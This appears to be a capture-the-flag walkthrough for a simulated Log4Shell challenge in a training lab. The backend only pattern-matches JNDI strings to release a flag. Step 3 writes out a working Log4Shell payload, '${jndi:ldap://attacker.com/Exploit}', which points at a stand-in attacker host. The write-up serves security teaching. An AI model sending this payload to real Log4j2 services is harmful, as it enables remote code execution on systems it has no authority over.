# Level 3 — Log4Shell

## Challenge Description

This challenge simulates a knowledge search service using Log4j2 2.14.1 for logging. User search keywords are logged, and Log4j2 resolves `${jndi:ldap://...}` lookup expressions in log messages, leading to JNDI injection RCE.

**Objective**: Inject a JNDI lookup expression in the search keyword to trigger Log4Shell and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `Log4shellController.java`

```
GET  /api/challenge/deser/log4shell/info    — Get app info (includes Log4j2 version)
POST /api/challenge/deser/log4shell/search  — Search (vulnerable entry)
```

**App Info**: Log4j2 2.14.1 (vulnerable to Log4Shell)

**Vulnerability**: User input is logged directly. Log4j2 2.14.1 resolves `${jndi:ldap://...}` expressions in log messages, triggering JNDI lookup and remote class loading.

### Source Code Snippet

```java
// Simulated logging (Log4Shell trigger point)
// log.info("User searched for: " + keyword);

Matcher jndiMatcher = JNDI_PATTERN.matcher(keyword);
if (jndiMatcher.find() || basicMatcher.find()) {
    String flag = flagService.getFlag("deserialization", "level3");
    result.put("log4shell_triggered", true);
    result.put("flag", flag);
}
```

## Walkthrough

### Step 1: Get App Info

```
GET /api/challenge/deser/log4shell/info
```

### Step 2: Normal Search

```json
POST /api/challenge/deser/log4shell/search
{"keyword": "Java"}
```

### Step 3: Inject JNDI Expression

```json
POST /api/challenge/deser/log4shell/search
{"keyword": "${jndi:ldap://attacker.com/Exploit}"}
```

### Step 4: Capture the Flag

Log4Shell triggered successfully returns the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/deserialization/Log4shellController.java` | Backend search endpoint |
| `service/FlagService.java` | Flag retrieval and validation |
